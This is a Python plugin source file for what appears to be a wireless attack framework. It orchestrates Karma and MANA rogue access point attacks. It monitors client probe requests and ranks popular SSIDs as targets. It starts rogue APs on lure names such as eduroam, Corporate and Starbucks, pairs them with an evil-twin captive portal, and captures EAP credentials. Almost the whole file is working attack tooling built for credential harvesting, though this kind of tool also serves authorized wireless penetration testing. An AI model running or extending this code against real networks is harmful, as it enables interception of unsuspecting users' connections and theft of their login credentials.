"""
Karma/MANA Attack Plugin - Rogue AP with automatic client association.

Provides Karma and MANA attack capabilities:
- Karma: Respond to all probe requests
- MANA: Enhanced Karma with EAP credential capture
- Probe monitoring: Track client probe requests

Combined with Evil Twin captive portal for credential harvesting.
"""

from __future__ import annotations

import asyncio
import logging
from typing import Any

logger = logging.getLogger(__name__)

# Plugin metadata
__plugin_name__ = "karma_mana"
__version__ = "1.0.0"
__author__ = "MoMo Team"
__description__ = "Karma/MANA attacks for automatic client association"
__requires__ = ["evil_twin"]

# Module-level state
_probe_monitor = None
_karma = None
_mana = None
_config = {}
_stats = {
    "karma_attacks": 0,
    "mana_attacks": 0,
    "probes_captured": 0,
    "clients_connected": 0,
    "credentials_captured": 0,
}


def on_load(config: dict[str, Any]) -> None:
    """Called when plugin loads."""
    global _config
    _config = config.get("karma", {})
    logger.info("Karma/MANA plugin loaded")


def on_ready(agent: Any) -> None:
    """Called when agent is ready."""
    global _probe_monitor
    
    try:
        from momo.infrastructure.karma.probe_monitor import MockProbeMonitor, ProbeMonitor
        
        interface = _config.get("interface", "wlan0")
        
        if _config.get("mock", False):
            _probe_monitor = MockProbeMonitor(interface)
        else:
            _probe_monitor = ProbeMonitor(interface)
        
        logger.info("Karma/MANA plugin ready on %s", interface)
        
    except ImportError as e:
        logger.warning("Karma module not available: %s", e)


async def start_probe_monitor(duration: int = 60) -> list[dict[str, Any]]:
    """
    Start monitoring probe requests.
    
    Args:
        duration: Capture duration in seconds
    
    Returns:
        List of captured probe requests
    """
    global _stats
    
    if not _probe_monitor:
        logger.error("Probe monitor not initialized")
        return []
    
    await _probe_monitor.start()
    probes = await _probe_monitor.capture_probes(duration)
    
    _stats["probes_captured"] += len(probes)
    
    return [p.to_dict() for p in probes]


def get_client_profiles() -> list[dict[str, Any]]:
    """Get all captured client profiles."""
    if not _probe_monitor:
        return []
    return [c.to_dict() for c in _probe_monitor.get_client_profiles()]


def get_popular_targets(min_clients: int = 2) -> list[dict[str, Any]]:
    """
    Get SSIDs probed by multiple clients.
    
    These are good targets for Karma attacks.
    """
    if not _probe_monitor:
        return []
    
    targets = _probe_monitor.get_popular_targets(min_clients)
    return [{"ssid": ssid, "client_count": count} for ssid, count in targets]


async def start_karma(
    interface: str | None = None,
    channel: int = 6,
    ssid_list: list[str] | None = None,
    enable_portal: bool = True,
) -> dict[str, Any]:
    """
    Start Karma attack.
    
    Args:
        interface: WiFi interface
        channel: Channel to operate on
        ssid_list: SSIDs to respond to (None = all)
        enable_portal: Enable captive portal
    
    Returns:
        Attack status
    """
    global _karma, _stats
    
    try:
        from momo.infrastructure.karma import KarmaAttack, KarmaConfig, MockKarmaAttack
        
        config = KarmaConfig(
            interface=interface or _config.get("interface", "wlan0"),
            channel=channel,
            ssid_list=ssid_list or [],
            enable_portal=enable_portal,
        )
        
        if _config.get("mock", False):
            _karma = MockKarmaAttack(config)
        else:
            _karma = KarmaAttack(config)
        
        success = await _karma.start()
        
        if success:
            _stats["karma_attacks"] += 1
        
        return {
            "status": "running" if success else "failed",
            "config": config.to_dict(),
        }
        
    except Exception as e:
        logger.error("Karma start error: %s", e)
        return {"status": "error", "message": str(e)}


async def stop_karma() -> dict[str, Any]:
    """Stop Karma attack."""
    global _karma
    
    if _karma:
        stats = _karma.get_stats()
        await _karma.stop()
        _karma = None
        return {"status": "stopped", "stats": stats}
    
    return {"status": "not_running"}


async def start_mana(
    interface: str | None = None,
    channel: int = 6,
    loud_ssids: list[str] | None = None,
    eap_enabled: bool = True,
) -> dict[str, Any]:
    """
    Start MANA attack.
    
    Args:
        interface: WiFi interface
        channel: Channel to operate on
        loud_ssids: SSIDs to broadcast
        eap_enabled: Enable EAP credential capture
    
    Returns:
        Attack status
    """
    global _mana, _stats
    
    try:
        from momo.infrastructure.karma import MANAAttack, MANAConfig, MockMANAAttack
        
        config = MANAConfig(
            interface=interface or _config.get("interface", "wlan0"),
            channel=channel,
            loud_ssids=loud_ssids or [
                "eduroam", "Corporate", "CORP-WiFi",
                "Starbucks", "attwifi", "xfinitywifi",
            ],
            eap_enabled=eap_enabled,
        )
        
        if _config.get("mock", False):
            _mana = MockMANAAttack(config)
        else:
            _mana = MANAAttack(config)
        
        success = await _mana.start()
        
        if success:
            _stats["mana_attacks"] += 1
        
        return {
            "status": "running" if success else "failed",
            "config": config.to_dict(),
        }
        
    except Exception as e:
        logger.error("MANA start error: %s", e)
        return {"status": "error", "message": str(e)}


async def stop_mana() -> dict[str, Any]:
    """Stop MANA attack."""
    global _mana
    
    if _mana:
        stats = _mana.get_stats()
        credentials = _mana.get_credentials()
        await _mana.stop()
        _mana = None
        return {
            "status": "stopped",
            "stats": stats,
            "credentials_captured": len(credentials),
        }
    
    return {"status": "not_running"}


def get_karma_status() -> dict[str, Any]:
    """Get Karma attack status."""
    if _karma:
        return {
            "running": _karma.is_running,
            "stats": _karma.get_stats(),
            "clients": [c.to_dict() for c in _karma.get_connected_clients()],
        }
    return {"running": False}


def get_mana_status() -> dict[str, Any]:
    """Get MANA attack status."""
    if _mana:
        return {
            "running": _mana.is_running,
            "stats": _mana.get_stats(),
            "credentials": [c.to_dict() for c in _mana.get_credentials()],
        }
    return {"running": False}


def get_metrics() -> dict[str, Any]:
    """Get Prometheus-compatible metrics."""
    metrics = {
        "momo_karma_attacks_total": _stats["karma_attacks"],
        "momo_mana_attacks_total": _stats["mana_attacks"],
        "momo_probes_captured_total": _stats["probes_captured"],
    }
    
    if _karma:
        metrics.update(_karma.get_metrics())
    
    if _mana:
        metrics.update(_mana.get_metrics())
    
    if _probe_monitor:
        metrics.update(_probe_monitor.get_metrics())
    
    return metrics


def get_stats() -> dict[str, Any]:
    """Get detailed statistics."""
    stats = _stats.copy()
    
    if _probe_monitor:
        stats["probe_monitor"] = _probe_monitor.get_stats()
    
    if _karma:
        stats["karma"] = _karma.get_stats()
    
    if _mana:
        stats["mana"] = _mana.get_stats()
    
    return stats


def on_unload() -> None:
    """Called when plugin unloads."""
    global _probe_monitor, _karma, _mana
    
    
    if _karma and _karma.is_running:
        asyncio.create_task(_karma.stop())
    
    if _mana and _mana.is_running:
        asyncio.create_task(_mana.stop())
    
    _probe_monitor = None
    _karma = None
    _mana = None
    
    logger.info("Karma/MANA plugin unloaded")

